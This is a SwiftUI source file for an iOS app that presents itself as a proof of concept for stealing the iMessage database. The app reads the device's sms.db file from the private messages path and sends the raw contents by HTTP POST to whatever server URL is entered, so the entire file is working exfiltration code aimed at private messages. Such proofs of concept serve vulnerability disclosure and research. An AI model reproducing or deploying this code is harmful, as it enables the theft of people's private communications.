import SwiftUI

struct ContentView: View {
    
    @State var serverURLString: String = ""
    
    var body: some View {
        
        VStack() {
            Text("""
                iMessage DB stealing PoC\n
                based on @s1guza's tweet\n
                coded by @_r3ggi
                """).multilineTextAlignment(.center)
        
            TextField("Server URL", text: $serverURLString).padding(.all, 40).textFieldStyle(RoundedBorderTextFieldStyle())
            
            Button(action: {
                sendPostData(serverURLString: self.serverURLString)
            }) {
                Text("Send your sms.db!")
            }
        }
    }
}


func sendPostData(serverURLString: String) {
    let messagesPath = "/private/var/mobile/Library/SMS/sms.db"
    let messagesURL = URL(fileURLWithPath: messagesPath)
    let serverURL = URL(string: serverURLString)
    var request = URLRequest(url: serverURL!)
    request.httpMethod = "POST"
    
    do {
        if FileManager.init().isReadableFile(atPath: messagesPath) {
            let rawMessagesDB = try Data(contentsOf: messagesURL)
            request.httpBody = rawMessagesDB
        } else {
            request.httpBody = "Nope".data(using: .utf8)
        }
    } catch {}
    
    let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
            if let error = error {
                print("Error took place \(error)")
                return
            }
    }
    task.resume()
}
